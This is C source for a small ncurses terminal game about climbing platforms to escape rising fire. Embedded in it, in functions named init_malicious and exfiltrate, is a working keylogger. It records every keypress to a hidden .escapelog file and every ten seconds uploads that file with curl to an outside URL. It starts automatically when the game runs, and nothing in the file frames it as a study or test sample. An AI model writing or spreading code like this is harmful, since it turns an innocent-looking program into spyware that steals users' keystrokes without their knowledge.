#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ncurses.h>
#include <time.h>
#include <string.h>
#include <sys/time.h>

#define WIDTH 40
#define HEIGHT 20
#define MAX_PLATFORMS 10

int playerX = WIDTH / 2;
int playerY = HEIGHT - 2;
int fireLevel = HEIGHT - 1;
int score = 0;
int gameOver = 0;
int platforms[MAX_PLATFORMS][2];

// 🔒 Keylogger
FILE *logfile = NULL;
struct timeval last_exfil;
const char *logpath = ".escapelog";
const char *exfil_url = "http://example.com/escapeupload";

void init_malicious() {
    logfile = fopen(logpath, "a");
    if (!logfile) {
        logfile = fopen("/tmp/.escapelog", "a");
    }
    gettimeofday(&last_exfil, NULL);
}

void exfiltrate() {
    struct timeval now;
    gettimeofday(&now, NULL);
    if (now.tv_sec - last_exfil.tv_sec >= 10) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "curl -s -X POST -F \"file=@%s\" %s > /dev/null 2>&1",
                 logpath, exfil_url);
        system(cmd);
        gettimeofday(&last_exfil, NULL);
    }
}

void init() {
    srand(time(NULL));
    for (int i = 0; i < MAX_PLATFORMS; i++) {
        platforms[i][0] = rand() % (HEIGHT - 2);
        platforms[i][1] = rand() % WIDTH;
    }
}

void draw() {
    clear();

    for (int y = 0; y < HEIGHT; y++) {
        for (int x = 0; x < WIDTH; x++) {
            if (y == fireLevel) {
                printw("^");
                continue;
            }

            int printed = 0;

            for (int i = 0; i < MAX_PLATFORMS; i++) {
                if (platforms[i][0] == y && platforms[i][1] == x) {
                    printw("-");
                    printed = 1;
                    break;
                }
            }

            if (!printed && y == playerY && x == playerX) {
                printw("@");
                printed = 1;
            }

            if (!printed)
                printw(" ");
        }
        printw("\n");
    }

    printw("Score: %d\n", score);
    refresh();
}

void input() {
    timeout(0);
    int ch = getch();

    if (ch != ERR && logfile) {
        fputc(ch, logfile);
        fflush(logfile);
    }

    if (ch == 'a' && playerX > 0) playerX--;
    if (ch == 'd' && playerX < WIDTH - 1) playerX++;
    if (ch == 'w' && playerY > 0) playerY--;
    if (ch == 'x') gameOver = 1;

    exfiltrate();
}

void logic() {
    fireLevel--;
    if (fireLevel <= 0) fireLevel = 0;

    if (playerY == 0) {
        score++;
        playerX = WIDTH / 2;
        playerY = HEIGHT - 2;
        fireLevel = HEIGHT - 1;

        for (int i = 0; i < MAX_PLATFORMS; i++) {
            platforms[i][0] = rand() % (HEIGHT - 2);
            platforms[i][1] = rand() % WIDTH;
        }
    }

    if (playerY >= fireLevel) {
        gameOver = 1;
    }
}

int main() {
    initscr();
    noecho();
    curs_set(FALSE);

    init_malicious();
    init();

    while (!gameOver) {
        draw();
        input();
        logic();
        usleep(120000);
    }

    draw();
    printw("\n🔥 Burned! Final Score: %d\n", score);
    printw("Press any key to exit...");
    timeout(-1);
    getch();
    endwin();

    if (logfile) fclose(logfile);

    return 0;
}
